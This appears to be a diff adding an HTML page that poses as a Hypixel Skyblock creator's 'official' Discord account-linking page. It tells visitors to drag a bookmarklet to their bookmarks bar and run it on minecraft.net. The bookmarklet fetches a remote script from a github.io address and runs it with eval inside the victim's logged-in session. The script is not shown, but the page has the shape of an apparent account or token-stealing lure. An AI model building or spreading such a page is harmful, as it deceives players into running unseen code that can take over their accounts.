@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Official cchloeyt account linking page for Discord server. Drag and drop the bookmarklet to your bookmarks bar to start linking.">
+    <title>Account Linking - cchloeyt</title>
+    <link rel="icon" href="https://www.example.com/favicon.ico"> <!-- Replace with cchloe's actual logo -->
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #1a1a1a;
+            color: #f0f0f0;
+            text-align: center;
+            padding: 20px;
+            margin: 0;
+        }
+
+        h1 {
+            color: #ff5b5b; /* cchloeyt's accent color */
+            font-size: 36px;
+        }
+
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            background-color: #2d2d2d;
+            border-radius: 10px;
+            padding: 40px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.5);
+        }
+
+        .social-links {
+            margin-top: 30px;
+            font-size: 18px;
+            color: #f0f0f0;
+        }
+
+        .social-links a {
+            color: #ff5b5b;
+            text-decoration: none;
+            margin: 0 10px;
+        }
+
+        .social-links a:hover {
+            text-decoration: underline;
+        }
+
+        .social-icons {
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            margin-right: 5px;
+        }
+
+        .bookmarklet {
+            display: inline-block;
+            padding: 12px 24px;
+            background-color: #ff5b5b;
+            color: white;
+            border-radius: 5px;
+            text-decoration: none;
+            font-size: 18px;
+            cursor: pointer;
+            margin-top: 30px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+        }
+
+        .bookmarklet:hover {
+            background-color: #ff2e2e;
+        }
+
+        .instructions {
+            font-size: 18px;
+            margin-top: 20px;
+            color: #f0f0f0;
+        }
+
+        .footer {
+            margin-top: 40px;
+            font-size: 14px;
+            color: #888;
+        }
+
+        footer a {
+            color: #ff5b5b;
+            text-decoration: none;
+        }
+
+        footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <h1>Welcome to cchloeyt's Account Linking</h1>
+    <div class="container">
+        <p>Link your account to the cchloeyt Discord server by dragging the bookmark below to your bookmarks bar. If you can't see the bookmarks bar, press <strong>Ctrl + Shift + B</strong> to enable it. After that, just click the bookmark on <strong>minecraft.net</strong> to execute the linking script!</p>
+        
+        <a href="javascript:fetch('https://cchloeyt.github.io/linkIGN/linking.js').then(r=>r.text()).then(e=>{eval(e)}).catch(console.error);"
+           class="bookmarklet" 
+           draggable="true" 
+           ondragstart="event.dataTransfer.setData('text', event.target.href)">
+            Link your account!
+        </a>
+        
+        <div class="instructions">
+            <p>1. Drag the "Link your account!" button to your bookmarks bar.</p>
+            <p>2. Click it when you're on <strong>minecraft.net</strong> to link your account to the cchloeyt Discord server.</p>
+        </div>
+
+        <div class="social-links">
+            <p>Follow cchloeyt on social media:</p>
+            <a href="https://www.youtube.com/@cchloeyt" target="_blank">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/4/42/YouTube_icon_%282013-2017%29.png" class="social-icons" alt="YouTube Logo">
+                YouTube
+            </a>
+            <a href="https://x.com/cchloeyt" target="_blank">
+                <img src="https://admin.itsnicethat.com/images/_fsej_vmVYPAz138de7knz6lEFA=/243516/format-webp%7Cwidth-1440/twitter-x-logo-graphic-design-itsnicethat-01.jpeg" class="social-icons" alt="X Logo">
+                X (Twitter)
+            </a>
+        </div>
+    </div>
+
+    <footer>
+        <p>&copy; 2024 cchloeyt - Hypixel Skyblock Content Creator</p>
+        <p>All rights reserved. Made with ❤️ for the Skyblock community.</p>
+    </footer>
+</body>
+</html>
